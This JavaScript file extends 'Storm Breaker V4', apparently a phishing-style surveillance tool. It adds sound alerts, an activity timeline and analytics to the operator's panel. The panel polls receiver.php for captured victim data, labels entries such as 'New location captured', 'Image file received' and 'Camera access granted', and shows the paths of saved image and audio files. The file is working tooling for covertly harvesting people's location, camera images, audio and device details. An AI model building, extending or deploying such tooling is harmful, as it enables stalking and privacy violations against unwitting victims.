// Advanced Features Extension for Storm Breaker V4
// Sound Notifications, Activity Timeline, and Analytics

// Sound Notification System
class SoundNotifier {
    constructor() {
        this.enabled = localStorage.getItem('soundEnabled') !== 'false';
        this.sounds = {
            newLog: this.createSound(800, 0.1, 'sine'),
            location: this.createSound(1000, 0.15, 'sine'),
            image: this.createSound(600, 0.1, 'triangle'),
            audio: this.createSound(700, 0.1, 'square'),
            error: this.createSound(400, 0.2, 'sawtooth')
        };
    }
    
    createSound(frequency, duration, type = 'sine') {
        return () => {
            if (!this.enabled) return;
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.value = frequency;
                oscillator.type = type;
                
                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + duration);
            } catch (e) {
                console.log('Sound not supported');
            }
        };
    }
    
    play(type) {
        if (this.sounds[type]) {
            this.sounds[type]();
        }
    }
    
    toggle() {
        this.enabled = !this.enabled;
        localStorage.setItem('soundEnabled', this.enabled);
        return this.enabled;
    }
}

// Activity Timeline
class ActivityTimeline {
    constructor() {
        this.activities = JSON.parse(localStorage.getItem('activities') || '[]');
        this.maxActivities = 100;
    }
    
    add(type, message, data = {}) {
        const activity = {
            id: Date.now(),
            type: type,
            message: message,
            data: data,
            timestamp: new Date().toISOString(),
            timeAgo: 'Just now'
        };
        
        this.activities.unshift(activity);
        
        if (this.activities.length > this.maxActivities) {
            this.activities = this.activities.slice(0, this.maxActivities);
        }
        
        this.save();
        this.render();
        
        return activity;
    }
    
    save() {
        localStorage.setItem('activities', JSON.stringify(this.activities));
    }
    
    clear() {
        this.activities = [];
        this.save();
        this.render();
    }
    
    getTypeIcon(type) {
        const icons = {
            location: '📍',
            image: '🖼️',
            audio: '🎵',
            device: '📱',
            fingerprint: '🔍',
            camera: '📷',
            microphone: '🎤',
            map: '🗺️',
            system: '⚙️',
            error: '❌'
        };
        return icons[type] || '📝';
    }
    
    getTimeAgo(timestamp) {
        const seconds = Math.floor((new Date() - new Date(timestamp)) / 1000);
        
        if (seconds < 60) return 'Just now';
        if (seconds < 3600) return Math.floor(seconds / 60) + ' min ago';
        if (seconds < 86400) return Math.floor(seconds / 3600) + ' hr ago';
        return Math.floor(seconds / 86400) + ' days ago';
    }
    
    render() {
        const container = document.getElementById('activityTimeline');
        if (!container) return;
        
        if (this.activities.length === 0) {
            container.innerHTML = '<div class="timeline-empty">No activity yet</div>';
            return;
        }
        
        let html = '';
        this.activities.slice(0, 20).forEach(activity => {
            html += `
                <div class="timeline-item" data-type="${activity.type}">
                    <div class="timeline-icon">${this.getTypeIcon(activity.type)}</div>
                    <div class="timeline-content">
                        <div class="timeline-message">${activity.message}</div>
                        <div class="timeline-time">${this.getTimeAgo(activity.timestamp)}</div>
                    </div>
                </div>
            `;
        });
        
        container.innerHTML = html;
    }
    
    updateTimeAgo() {
        this.render();
    }
}

// Analytics Engine
class AnalyticsEngine {
    constructor() {
        this.data = JSON.parse(localStorage.getItem('analyticsData') || '{}');
        if (!this.data.logs) this.data.logs = [];
        if (!this.data.countries) this.data.countries = {};
        if (!this.data.browsers) this.data.browsers = {};
        if (!this.data.devices) this.data.devices = {};
        if (!this.data.hours) this.data.hours = {};
    }
    
    track(logData) {
        this.data.logs.push({
            timestamp: new Date().toISOString(),
            type: logData.type || 'unknown',
            data: logData
        });
        
        // Track by hour
        const hour = new Date().getHours();
        this.data.hours[hour] = (this.data.hours[hour] || 0) + 1;
        
        this.save();
    }
    
    save() {
        localStorage.setItem('analyticsData', JSON.stringify(this.data));
    }
    
    getStats() {
        return {
            total: this.data.logs.length,
            today: this.getTodayCount(),
            thisHour: this.getHourCount(),
            topCountry: this.getTopCountry(),
            topBrowser: this.getTopBrowser(),
            peakHour: this.getPeakHour()
        };
    }
    
    getTodayCount() {
        const today = new Date().toDateString();
        return this.data.logs.filter(log => 
            new Date(log.timestamp).toDateString() === today
        ).length;
    }
    
    getHourCount() {
        const now = new Date();
        const hourAgo = new Date(now - 3600000);
        return this.data.logs.filter(log =>
            new Date(log.timestamp) > hourAgo
        ).length;
    }
    
    getTopCountry() {
        const entries = Object.entries(this.data.countries);
        if (entries.length === 0) return 'N/A';
        return entries.sort((a, b) => b[1] - a[1])[0][0];
    }
    
    getTopBrowser() {
        const entries = Object.entries(this.data.browsers);
        if (entries.length === 0) return 'N/A';
        return entries.sort((a, b) => b[1] - a[1])[0][0];
    }
    
    getPeakHour() {
        const entries = Object.entries(this.data.hours);
        if (entries.length === 0) return 'N/A';
        const peak = entries.sort((a, b) => b[1] - a[1])[0][0];
        return peak + ':00';
    }
    
    clear() {
        this.data = {
            logs: [],
            countries: {},
            browsers: {},
            devices: {},
            hours: {}
        };
        this.save();
    }
}

// Initialize features
const soundNotifier = new SoundNotifier();
const activityTimeline = new ActivityTimeline();
const analytics = new AnalyticsEngine();

// Add to existing listener function
const originalListenerV2 = window.Listener;
window.Listener = function() {
    $.post("receiver.php", {"send_me_result": ""}, function(data) {
        if (data != "") {
            // Track analytics
            analytics.track({
                type: detectLogType(data),
                size: data.length
            });
            
            // Add to timeline
            const type = detectLogType(data);
            activityTimeline.add(type, getLogMessage(data, type), {raw: data});
            
            // Play sound
            soundNotifier.play(type);
            
            // Track in original
            if (typeof trackNewLog === 'function') {
                trackNewLog(data);
            }
            
            // Show notification
            if (data.includes("Image")) {
                show_notif("Image File Saved", 'Path : ' + data.slice(26), true);
            } else if (data.includes("Audio")) {
                show_notif("Audio File Saved", 'Path : ' + data.slice(26), false);
            } else if (data.includes("Google Map")) {
                show_notif("Google Map Link", data.slice(18), true);
            }

            old_data += data + "\n-------------------------\n";
            $("#result").val(old_data);
            
            // Update analytics display
            updateAnalyticsDisplay();
        }
    });
};

function detectLogType(data) {
    if (data.includes('Google Map') || data.includes('Location')) return 'location';
    if (data.includes('Image')) return 'image';
    if (data.includes('Audio')) return 'audio';
    if (data.includes('Fingerprint') || data.includes('Device')) return 'device';
    if (data.includes('Camera')) return 'camera';
    if (data.includes('Microphone')) return 'microphone';
    return 'system';
}

function getLogMessage(data, type) {
    const messages = {
        location: 'New location captured',
        image: 'Image file received',
        audio: 'Audio file received',
        device: 'Device info collected',
        camera: 'Camera access granted',
        microphone: 'Microphone access granted'
    };
    return messages[type] || 'New log entry';
}

// Toggle sound notifications
function toggleSound() {
    const enabled = soundNotifier.toggle();
    const btn = document.getElementById('soundToggle');
    if (btn) {
        btn.innerHTML = enabled ? 
            '<i class="fas fa-volume-up"></i> Sound On' : 
            '<i class="fas fa-volume-mute"></i> Sound Off';
        btn.className = enabled ? 'btn-success-modern btn-modern' : 'btn-secondary-modern btn-modern';
    }
    
    Swal.fire({
        icon: 'info',
        title: enabled ? 'Sound Enabled' : 'Sound Disabled',
        timer: 1500,
        showConfirmButton: false
    });
}

// Show analytics modal
function showAnalytics() {
    const stats = analytics.getStats();
    
    Swal.fire({
        title: '📊 Analytics Dashboard',
        html: `
            <div style="text-align: left; padding: 20px;">
                <div style="margin-bottom: 15px;">
                    <strong>Total Logs:</strong> ${stats.total}
                </div>
                <div style="margin-bottom: 15px;">
                    <strong>Today:</strong> ${stats.today}
                </div>
                <div style="margin-bottom: 15px;">
                    <strong>This Hour:</strong> ${stats.thisHour}
                </div>
                <div style="margin-bottom: 15px;">
                    <strong>Top Country:</strong> ${stats.topCountry}
                </div>
                <div style="margin-bottom: 15px;">
                    <strong>Top Browser:</strong> ${stats.topBrowser}
                </div>
                <div style="margin-bottom: 15px;">
                    <strong>Peak Hour:</strong> ${stats.peakHour}
                </div>
            </div>
        `,
        showCancelButton: true,
        confirmButtonText: 'Clear Data',
        cancelButtonText: 'Close',
        confirmButtonColor: '#e74c3c'
    }).then((result) => {
        if (result.isConfirmed) {
            analytics.clear();
            Swal.fire('Cleared!', 'Analytics data cleared', 'success');
        }
    });
}

// Show activity timeline
function showTimeline() {
    activityTimeline.render();
    
    Swal.fire({
        title: '⏱️ Activity Timeline',
        html: '<div id="timelineModal" style="max-height: 400px; overflow-y: auto;"></div>',
        width: '600px',
        showCancelButton: true,
        confirmButtonText: 'Clear Timeline',
        cancelButtonText: 'Close',
        confirmButtonColor: '#e74c3c',
        didOpen: () => {
            const container = document.getElementById('timelineModal');
            if (activityTimeline.activities.length === 0) {
                container.innerHTML = '<p style="text-align: center; color: #666;">No activity yet</p>';
            } else {
                let html = '';
                activityTimeline.activities.forEach(activity => {
                    html += `
                        <div style="padding: 10px; border-bottom: 1px solid #eee; display: flex; align-items: center;">
                            <span style="font-size: 1.5rem; margin-right: 10px;">${activityTimeline.getTypeIcon(activity.type)}</span>
                            <div style="flex-grow: 1;">
                                <div style="font-weight: bold;">${activity.message}</div>
                                <div style="font-size: 0.85rem; color: #666;">${activityTimeline.getTimeAgo(activity.timestamp)}</div>
                            </div>
                        </div>
                    `;
                });
                container.innerHTML = html;
            }
        }
    }).then((result) => {
        if (result.isConfirmed) {
            activityTimeline.clear();
            Swal.fire('Cleared!', 'Timeline cleared', 'success');
        }
    });
}

// Update analytics display on page
function updateAnalyticsDisplay() {
    const stats = analytics.getStats();
    if (document.getElementById('analytics-total')) {
        document.getElementById('analytics-total').textContent = stats.total;
    }
    if (document.getElementById('analytics-today')) {
        document.getElementById('analytics-today').textContent = stats.today;
    }
    if (document.getElementById('analytics-hour')) {
        document.getElementById('analytics-hour').textContent = stats.thisHour;
    }
}

// Auto-update timeline every 30 seconds
setInterval(() => {
    activityTimeline.updateTimeAgo();
}, 30000);

// Initialize on load
$(document).ready(function() {
    updateAnalyticsDisplay();
    activityTimeline.render();
});
